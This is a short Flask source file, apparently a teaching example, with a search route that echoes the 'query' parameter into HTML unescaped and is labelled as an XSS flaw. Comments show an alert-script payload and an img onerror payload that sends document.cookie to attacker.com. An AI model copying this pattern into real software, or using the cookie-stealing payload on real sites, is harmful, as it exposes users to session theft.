from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('query', '')

    # XSS vulnerability!
    html = f"""
    <html>
        <body>
            <h1>Search Results for: {query}</h1>
            <p>No results found</p>
        </body>
    </html>
    """

    return html

# Attack: /search?query=<script>alert('XSS')</script>
# Executes JavaScript in victim's browser!

# Attack: /search?query=<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
# Steals user's cookies!
